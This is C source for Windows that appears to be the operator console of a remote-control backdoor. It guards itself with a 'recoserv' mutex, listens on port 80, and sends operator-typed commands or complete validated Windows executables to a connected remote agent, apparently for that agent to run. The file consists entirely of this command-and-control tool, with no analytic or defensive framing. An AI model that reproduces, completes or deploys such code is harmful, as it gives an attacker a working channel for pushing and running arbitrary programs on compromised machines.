#include <stdio.h>
#include <winsock2.h>

void main()
{
	char buf[256], *pbuf = NULL;
	int len = 0;
	FILE *f = NULL;
	WSADATA wsad;
	SOCKET sock;
	struct sockaddr_in sa;
	IMAGE_DOS_HEADER idh;
	IMAGE_NT_HEADERS inh;

	CreateMutex(NULL, FALSE, "recoserv");
	if (GetLastError() == ERROR_ALREADY_EXISTS) return;

	if (WSAStartup(MAKEWORD(2, 2), &wsad) ||
	(sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) goto procend;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = INADDR_ANY;
	sa.sin_port = htons(80);
	if (bind(sock, (SOCKADDR *)&sa, sizeof(sa)) == SOCKET_ERROR ||
	listen(sock, 1) == SOCKET_ERROR) goto procend;
	while ((sock = accept(sock, NULL, NULL)) == SOCKET_ERROR);

	for (;;) {
		free(pbuf);
		if (f != NULL) {
			fclose(f);
			f = NULL;
		}
		if (len == SOCKET_ERROR) break;

		printf("command> ");
		fgets(buf, 256, stdin);
		buf[strlen(buf) - 1] = '\0';

		if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "end", 3) == 0 ||
		strncmp(buf, "quit", 4) == 0 || strncmp(buf, "e", 1) == 0 || strncmp(buf, "q", 1) == 0) break;

		if (strncmp(buf, "!", 1) == 0) {
			if ((f = fopen(buf + 1, "rb")) == NULL || fread(&idh, sizeof(idh), 1, f) < 1 ||
			idh.e_magic != IMAGE_DOS_SIGNATURE || fseek(f, idh.e_lfanew, SEEK_SET) ||
			fread(&inh, sizeof(inh), 1, f) < 1 || inh.Signature != IMAGE_NT_SIGNATURE ||
			fseek(f, 0, SEEK_SET) || (len = filelength(fileno(f))) < 1024 ||
			(pbuf = malloc(len + 4)) == NULL || fread(pbuf + 4, 1, len, f) < len) continue;

			printf("EXE send\n");
			*(int *)pbuf = len;
		} else {
			len = strlen(buf);
			if ((pbuf = malloc(len + 4)) == NULL) continue;
			memcpy(pbuf + 4, buf, len);

			printf("Cmd send\n");
			*(int *)pbuf = 0xffffffff;
		}
		len = send(sock, pbuf, len + 4, 0);
	}

procend:
	if ((len = WSAGetLastError()) != 0) {
		printf("Winsock error code: %d", len);
		getch();
	}
	closesocket(sock);
	WSACleanup();
}
